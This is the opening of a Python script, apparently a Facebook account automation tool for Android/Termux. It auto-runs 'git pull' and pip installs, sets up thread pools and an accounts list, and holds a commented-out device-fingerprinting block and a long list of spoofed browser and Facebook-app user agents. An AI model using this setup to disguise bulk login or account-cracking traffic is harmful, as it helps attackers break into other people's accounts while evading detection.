 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;91m[\033[1;92m'+str(t)+'\033[1;91m]\033[1;92m '

###USERAGENTSGEN####
'''
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = []

import requests
rs = requests.get
ua = []

del ua
"""
[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:53.0) Gecko/20100101 Firefox/53.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.2; RadioClicker LITE; RadioClicker http://radioclicker.com; .NET CLR 2.0.50727)
Mozilla/5.0 (Linux; U; Android 1.5; ru-ru; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1
Opera/9.80 (Windows NT 6.1; U; Edition Yx; ru) Presto/2.10.229 Version/11.61
Opera/9.80 (Windows NT 5.1; U; MRA 5.7 (build 03790); ru) Presto/2.10.229 Version/11.61
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; CMDTDF; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1772.0 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/58.0.3029.83 Mobile/14E304 Safari/602.1
Mozilla/5.0 (Linux; Android 4.1.2; GT-N5110 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-G530AZ Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-G920A Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; LGMS330 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-T560NU Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Safari/537.36
Mozilla/5.0 (X11; CrOS armv7l 9000.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_2_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/58.0.3029.113 Mobile/14D27 Safari/602.1
Mozilla/5.0 (Linux; Android 5.1.1; LGLS665 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.2.5 (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/27.0.155813979 Mobile/14E304 Safari/602.1
Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/58.0.3029.113 Mobile/14E304 Safari/602.1
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.1 (KHTML, like Gecko) Version/10.0 Mobile/14G5028a Safari/602.1
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MDDRJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G920A Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-V410 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/27.0.155813979 Mobile/14A456 Safari/602.1
Mozilla/5.0 (Linux; Android 7.0; Moto G (4) Build/NPJS25.93-14-4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T320 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.21 (KHTML, like Gecko) Version/10.0 Mobile/15A5278f Safari/602.1
Mozilla/5.0 (iPad; CPU OS 10_3_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/27.0.155813979 Mobile/14F89 Safari/602.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8
Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A806 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 9460.60.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_3_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/29.0.159059490 Mobile/14F89 Safari/602.1
com.google.GoogleMobile/29.0.0 iPhone/10.3.2 hw/iPhone7_2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.38 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) GSA/29.0.159059490 Mobile/13G36 Safari/601.1
com.google.GoogleMobile/29.0.0 iPad/9.3.5 hw/iPad2_4
com.google.GoogleMobile/23.1.0 iPhone/8.1.1 hw/iPhone7_2
Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/29.0.159059490 Mobile/14B100 Safari/602.1
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.4 (KHTML, like Gecko) Version/10.0 Mobile/14G5047a Safari/602.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700T1 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; .NET CLR 1.1.4322)
Dalvik/2.1.0 (Linux; U; Android 5.1; XT1096 Build/LPES23.32-25-5-5)
Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.11 Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G920P Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (X11; CrOS i686 9202.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.146 Safari/537.36
Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.5) Gecko/20060819 Firefox/1.5.0.5
Mozilla/5.0 (Linux; Android 6.0.1; SM-G900T Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ADMC; rv:11.0) like Gecko
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) GSA/31.0.161834491 Mobile/13G36 Safari/601.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_3_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/31.0.161834491 Mobile/14F89 Safari/602.1
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 AOL/9.8 AOLBuild/4346.2022.US Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/55.0.2883.79 Mobile/13F69 Safari/601.1.46
Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) GSA/31.0.161834491 Mobile/13F69 Safari/601.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8)
Apache-HttpClient/4.5.3-SNAPSHOT (Java/1.8.0_144)
Mozilla/5.0 (Linux; Android 6.0.1; SM-G550T1 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/26.0.154727556 Mobile/14F89 Safari/602.1
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 OPR/18.0.1284.68
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8
Mozilla/5.0 (Windows NT 6.3; rv:25.0) Gecko/20100101 Firefox/25.0
Mozilla/5.0 (Linux; Android 7.0; SM-T813 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36
Dalvik/2.1.0 (Linux; U; Android 7.0; SM-T813 Build/NRD90M)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1; B3-A20 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.68 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; E6653 Build/32.4.A.0.160) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36
Java/1.8.0_141
Mozilla/5.0 (X11; CrOS armv7l 9592.71.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.80 Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; D5803 Build/23.5.A.1.291) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36
Opera/9.80 (Window NT 6.2; Win64; x64) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Android 7.0; Mobile; rv:55.0.2) Gecko/55.0.2 Firefox/55.0.2
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500FN Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2597.57
Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SM-P900 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/34.1.167176684 Mobile/14B100 Safari/602.1
Mozilla/5.0 (Linux; Android 6.0.1; D6633 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-J120A Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.18.US Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; P01MA Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/34.1.167176684 Mobile/14A456 Safari/602.1
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 AOL/9.8 AOLBuild/4346.2023.US Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-J727V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko)
Safari/12604.1.38.1.7 CFNetwork/811.5.4 Darwin/16.7.0 (x86_64)
Mozilla/5.0 (Linux; Android 7.0; SM-G930T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36
Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G900V Build/MMB29M)
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]
Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]
Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/268.1.0.54.121;]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPad; CPU iPad OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/MessengerForiOS;FBAV/142.0.0.38.63;FBBV/77803202;FBDV/iPad8,4;FBMD/iPad;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/NOS;FBID/phone;FBLC/jv_ID;FBOP/5;FBRV/77803202]
Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/pt_PT;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBAV/151.0.0.45.96;FBBV/90061748;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/MEO;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/Machintosh,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/3;FBCR/NOS;FBID/phone;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/de_DE;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/148.0.0.31.386;FBBV/86952252;FBDV/iPad6,11;FBMD/iPad;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/;FBID/tablet;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B410 [FBAN/MessengerForiOS;FBAV/153.0.0.47.97;FBBV/91923955;FBDV/iPad4,2;FBMD/iPad;FBSN/iPhone OS;FBSV/8.1;FBSS/2;FBCR/MegaFon;FBID/tablet;FBLC/id_ID;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/o2-de;FBID/phone;FBLC/id_ID;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/3;FBCR/NOS;FBID/phone;FBLC/ja_JP;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBAV/167.0.0.57.96;FBBV/109575372;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/MegaFon;FBID/phone;FBLC/ru_RU
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Tele2;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.2.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/12.4;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/12.3.2;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/11.0.0.15.14;FBBV/4026123;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/172.0.0.51.84;FBBV/115215338;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;F
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/YOTA;FBID/phone;FBLC/ru_RU;F
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/MobileTeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]
